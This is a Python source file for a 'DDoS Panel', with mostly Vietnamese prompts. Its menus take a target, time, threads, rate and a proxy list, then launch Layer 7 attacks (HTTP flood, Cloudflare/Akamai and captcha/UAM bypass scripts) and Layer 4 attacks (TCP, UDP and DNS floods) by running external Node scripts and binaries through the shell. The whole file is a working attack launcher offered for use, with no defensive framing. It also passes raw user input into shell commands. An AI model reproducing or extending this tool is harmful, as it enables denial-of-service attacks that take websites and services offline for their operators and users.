import os
import subprocess

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def proxy_mode():
    while True:
        clear()
        print("Đang chạy Proxy Checker...")
        subprocess.run("node proxy.js", shell=True)
        back = input("\nXong proxy! Nhấn Enter để về menu chính...")
        return

def layer7():
    while True:
        clear()
        print("╔══════════════════════════╗")
        print("║      Layer 7 Attack      ║")
        print("╚══════════════════════════╝\n")
        print("    1. Flood")
        print("    2. Cloudflare - Akamai")
        print("    3. Captcha")
        print("    4. Uam\n")
        
        use = input("Use: y/n → ").strip().lower()
        if use not in ["y", "yes", ""]:
            return
        
        clear()
        print("╔══════════════════════════╗")
        print("║      Layer 7 Attack      ║")
        print("╚══════════════════════════╝\n")
        print("    1. Flood")
        print("    2. Cloudflare - Akamai")
        print("    3. Captcha")
        print("    4. Uam\n")
        
        while True:
            method_input = input("\nMethod: ").strip()
            if method_input in ["n", "back", "0"]:
                return
            try:
                method = int(method_input)
                if method in [1,2,3,4]:
                    break
                else:
                    print("Chỉ chọn 1-4")
            except:
                print("Nhập số đàng hoàng")

        target = input("Target: ").strip()
        if target.lower() in ["n", "back", "0"]:
            return

        while True:
            t = input("Time: ").strip()
            if t.lower() in ["n", "back", "0"]:
                return
            try:
                time = int(t)
                if time > 0: break
                print("Time phải > 0")
            except:
                print("Time phải là số")

        while True:
            t = input("Threads: ").strip()
            if t.lower() in ["n", "back", "0"]:
                return
            try:
                threads = int(t)
                if threads > 0: break
                print("Threads phải > 0")
            except:
                print("Threads phải là số")

        while True:
            r = input("Rate: ").strip()
            if r.lower() in ["n", "back", "0"]:
                return
            try:
                rate = int(r)
                if rate > 0: break
                print("Rate phải > 0")
            except:
                print("Rate phải là số")

        proxy = input("Proxy: (Default: proxy.txt) ").strip()
        if proxy.lower() in ["n", "back", "0"]:
            return
        if proxy == "":
            proxy = "proxy.txt"

        print("\nBắt đầu tấn công Layer 7...\n")

        if method == 1:
            cmd = f"node cf.js {target} {time} {threads} {rate} {proxy}"
        elif method == 2:
            cmd = f"node cf.js {target} {time} {threads} {rate} {proxy} --full --cache"
        elif method == 3:
            cmd = f"node captcha.js {target} {time} {threads} {rate} {proxy}"
        elif method == 4:
            cmd = f"node uam.js {target} {time} {threads} {rate} {proxy}"

        subprocess.run(cmd, shell=True)
        input("\nAttack hoàn tất! Nhấn Enter để tiếp hoặc n để back...")
        return

def layer4():
    while True:
        clear()
        print("╔══════════════════════════╗")
        print("║      Layer 4 Method      ║")
        print("╚══════════════════════════╝\n")
        print("    1. Tcp")
        print("    2. Udp")
        print("    3. Dns\n")
        
        use = input("Use: y/n → ").strip().lower()
        if use not in ["y", "yes", ""]:
            return
        
        clear()
        print("Layer 4 Methods")
        print("1. Tcp")
        print("2. Udp")
        print("3. Dns")
        
        while True:
            method_input = input("\nMethod: ").strip()
            if method_input in ["n", "back", "0"]:
                return
            try:
                method = int(method_input)
                if method in [1,2,3]:
                    break
                else:
                    print("Chỉ chọn 1-3")
            except:
                print("Nhập số")

        ip = input("Ip: ").strip()
        if ip.lower() in ["n", "back", "0"]:
            return

        port_input = input("Port: (Default: 80) ").strip()
        if port_input.lower() in ["n", "back", "0"]:
            return
        port = port_input if port_input else "80"

        while True:
            t = input("Time: ").strip()
            if t.lower() in ["n", "back", "0"]:
                return
            try:
                time = int(t)
                if time > 0: break
                print("Time phải > 0")
            except:
                print("Time phải là số")

        print("\nBắt đầu tấn công Layer 4...\n")

        if method == 1:
            cmd = f"./fjium-mix {ip} {port} {time}"
        elif method == 2:
            cmd = f"./fjium-udp {ip} {port} {time}"
        elif method == 3:
            cmd = f"./fjium-dns {ip} {port} {time}"

        subprocess.run(cmd, shell=True)
        input("\nAttack hoàn tất! Nhấn Enter để tiếp hoặc n để back...")
        return

def ddos_menu():
    while True:
        clear()
        print("╔══════════════════════════╗")
        print("║       DDoS Method        ║")
        print("╚══════════════════════════╝\n")
        print("    1. Layer 7")
        print("    2. Layer 4\n")
        
        choice = input("Choose: ").strip()
        if choice == "1":
            layer7()
        elif choice == "2":
            layer4()
        else:
            return

def main():
    while True:
        clear()
        print("""
    ╔══════════════════════════════════╗
    ║           DDoS Panel             ║
    ║       1. Proxy                   ║
    ║       2. DDoS                    ║
    ╚══════════════════════════════════╝
        """)
        choice = input("Choose: ").strip()
        if choice == "1":
            proxy_mode()
        elif choice == "2":
            ddos_menu()
        else:
            print("Chỉ có 1 hoặc 2")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        clear()
        print("\nThoát tool. Bye!")
        exit()